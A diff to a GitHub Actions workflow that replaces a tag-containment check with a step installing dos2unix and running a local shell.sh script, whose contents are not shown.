@@ -14,17 +14,12 @@ jobs:
         shell: bash
 
     steps:
-    - uses: rickstaa/action-contains-tag@v1
-      id: contains_tag
-      with:
-          reference: "master"
-          tag: ${{ github.ref }}
-    - run: |
-          if [[ ${{ steps.contains_tag.outputs.retval }} = 'true' ]]; then
-            echo "Branch/commit did not contain the tag."
-          else
-            echo "Branch/commit did  contain the tag."
-          fi
+    - name: checking whether the tags are valid or not
+      run: |
+       sudo apt-get install -y dos2unix
+       dos2unix shell.sh
+       chmod 777 shell.sh
+       ./shell.sh
 
     - name: git repo Checkout
       uses: actions/checkout@v2
